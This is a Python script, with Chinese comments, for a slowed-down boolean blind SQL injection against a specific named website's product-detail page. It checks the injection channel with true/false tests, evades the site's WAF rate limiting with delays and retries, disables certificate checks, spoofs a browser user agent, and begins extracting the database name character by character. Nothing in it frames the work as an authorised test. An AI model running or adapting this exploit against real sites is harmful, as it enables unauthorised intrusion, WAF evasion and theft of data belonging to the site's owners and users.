#!/usr/bin/env python3
"""yijing_slow_dump.py - 降速布尔盲注(内容特征+限频规避)"""
import urllib.request, urllib.parse, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(3):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(3); continue  # 限频, 等待重试
        if 'Invalid SQL' in b:
            return None
        return TRUE_MARK in b
    return None

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(0.5)  # 降速
    return r

def get_len(expr):
    for n in range(1, 33):
        r = test("length(%s)=%d" % (expr, n))
        if r is True:
            return n
        if r is None:
            time.sleep(2)
    return None

def get_char(expr, pos, charset):
    for ch in charset:
        r = test("ascii(substr(%s,%d,1))=%d" % (expr, pos, ord(ch)))
        if r is True:
            return ch
        if r is None:
            time.sleep(2)
    return None

if __name__ == '__main__':
    t = test('1=1')
    print('真=%s' % t, flush=True)
    f = test('1=2')
    print('假=%s' % f, flush=True)
    if t is not True or f is not False:
        print('通道不稳', flush=True)
        sys.exit(1)

    # 先只提取database首个字符验证链路
    print('=== 提取database首个字符 ===', flush=True)
    for ch in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        r = test("ascii(substr(database(),1,1))=%d" % ord(ch))
        if r is True:
            print('database()[1] = %r' % ch, flush=True)
            break
        print('  试 %r -> %s' % (ch, r), flush=True)
